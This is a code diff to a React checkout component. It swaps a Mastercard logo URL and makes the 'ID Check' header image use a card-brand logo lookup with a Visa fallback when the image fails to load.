@@ -185,7 +185,7 @@ const Checkout = () => {
   // Card brand logos
   const cardBrandLogos = {
     visa: 'https://brandlogos.net/wp-content/uploads/2025/04/visa_secure_badge-logo_brandlogos.net_n9x0z-300x300.png',
-    mastercard: 'https://www.zemplerbank.com/_gatsby/image/7ebfe7b59db9bfc6eaa37054cc8408c1/5dd4f65fbae2cfbdea58fecc2027f1c2/file.idcheck_logo_new.jpg?u=https://cms-live.zemplerbank.com/media/ynipjxfp/idcheck_logo_new.jpg&a=w=750&h=750&fit=crop&crop=center&fm=jpg&q=75&cd=7354cb526a7837deb0a90f42ba9b3dd8',
+    mastercard: 'https://www.freepnglogos.com/uploads/mastercard-png/mastercard-logo-logok-15.png',
     discover: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png',
     rupay: 'https://logotyp.us/file/rupay.svg',
     amex: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png' // fallback to discover for amex
@@ -1544,15 +1544,13 @@ const Checkout = () => {
                   <div className="flex items-center justify-between px-8 pt-8 pb-2 border-b border-gray-200">
                     <div className="flex items-center gap-2">
                       <img
-                        src={
-                          getCardType(cardData.cardNumber) === 'visa' ? 'https://www.unitybank.com.au/media/1362/visa-secure-logo.png?width=250&height=250' :
-                          getCardType(cardData.cardNumber) === 'mastercard' ? 'https://www.cardcomplete.com/media/medialibrary/2019/06/logo_mcidcheck_440.jpg' :
-                          getCardType(cardData.cardNumber) === 'discover' ? 'https://images.seeklogo.com/logo-png/49/2/discover-card-logo-png_seeklogo-499264.png' :
-                          getCardType(cardData.cardNumber) === 'rupay' ? 'https://images.seeklogo.com/logo-png/25/1/rupay-logo-png_seeklogo-256357.png' :
-                          'https://www.unitybank.com.au/media/1362/visa-secure-logo.png?width=250&height=250'
-                        }
+                        src={cardBrandLogos[getCardBrand(cardData.cardNumber) as keyof typeof cardBrandLogos]}
                         alt="Card Brand Logo"
                         className="h-10 w-24 object-contain"
+                        onError={(e) => {
+                          console.log('Header logo loading failed, falling back to Visa');
+                          e.currentTarget.src = cardBrandLogos.visa;
+                        }}
                       />
                       <span className="font-semibold text-gray-700 text-base">ID Check</span>
                     </div>
